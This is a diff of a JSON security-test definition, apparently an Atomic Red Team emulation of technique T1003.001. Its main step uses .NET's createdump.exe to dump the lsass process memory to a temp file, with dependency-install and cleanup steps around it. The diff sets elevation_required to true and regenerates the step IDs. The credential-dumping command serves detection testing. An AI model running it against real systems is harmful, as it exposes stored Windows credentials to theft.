@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "fee8a7fd-603f-4666-ae9b-86ca577e804b",
+      "id": "26e80568-32e6-412f-bd16-5eab5b556845",
       "type": "execute-command",
       "data": {
         "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n\u0026 \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "76a911f5-49f1-456c-a7b3-f56244fa7f91",
+      "id": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "f806ca9a-be3d-4d8f-8a84-586a3bcc1c60",
+      "id": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
       "name": "Check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "cd4adaaf-a60f-40d9-ac95-9fcf9958268d",
+      "id": "e457e550-29ce-4f7b-a679-f831f127ad24",
       "name": "Resolve dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "b7b7892c-20c4-4b03-a9d5-f49a02fc6580",
+      "id": "c7c1e05b-d095-4e7a-b108-bb25be86ad81",
       "name": "Re-check dependency 1/1",
       "description": ".Net v5 must be installed\n",
       "type": "execute-command",
@@ -55,43 +55,43 @@
         "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "fee8a7fd-603f-4666-ae9b-86ca577e804b",
+      "s": "26e80568-32e6-412f-bd16-5eab5b556845",
       "p": "on-success",
-      "o": "76a911f5-49f1-456c-a7b3-f56244fa7f91"
+      "o": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1"
     },
     {
-      "s": "fee8a7fd-603f-4666-ae9b-86ca577e804b",
+      "s": "26e80568-32e6-412f-bd16-5eab5b556845",
       "p": "on-failure",
-      "o": "76a911f5-49f1-456c-a7b3-f56244fa7f91"
+      "o": "cc0f121f-e1b4-494c-a8c4-c8de67c862a1"
     },
     {
-      "s": "f806ca9a-be3d-4d8f-8a84-586a3bcc1c60",
+      "s": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
       "p": "on-success",
-      "o": "fee8a7fd-603f-4666-ae9b-86ca577e804b"
+      "o": "26e80568-32e6-412f-bd16-5eab5b556845"
     },
     {
-      "s": "f806ca9a-be3d-4d8f-8a84-586a3bcc1c60",
+      "s": "fd540a73-2e7b-46ac-86e6-bb8fc8ed99fc",
       "p": "on-failure",
-      "o": "cd4adaaf-a60f-40d9-ac95-9fcf9958268d"
+      "o": "e457e550-29ce-4f7b-a679-f831f127ad24"
     },
     {
-      "s": "cd4adaaf-a60f-40d9-ac95-9fcf9958268d",
+      "s": "e457e550-29ce-4f7b-a679-f831f127ad24",
       "p": "on-success",
-      "o": "b7b7892c-20c4-4b03-a9d5-f49a02fc6580"
+      "o": "c7c1e05b-d095-4e7a-b108-bb25be86ad81"
     },
     {
-      "s": "b7b7892c-20c4-4b03-a9d5-f49a02fc6580",
+      "s": "c7c1e05b-d095-4e7a-b108-bb25be86ad81",
       "p": "on-failure",
-      "o": "fee8a7fd-603f-4666-ae9b-86ca577e804b"
+      "o": "26e80568-32e6-412f-bd16-5eab5b556845"
     }
   ],
   "tags": [
-    "T1003.001",
-    "atomic-red-team"
+    "T1003",
+    "T1003.001"
   ]
 }
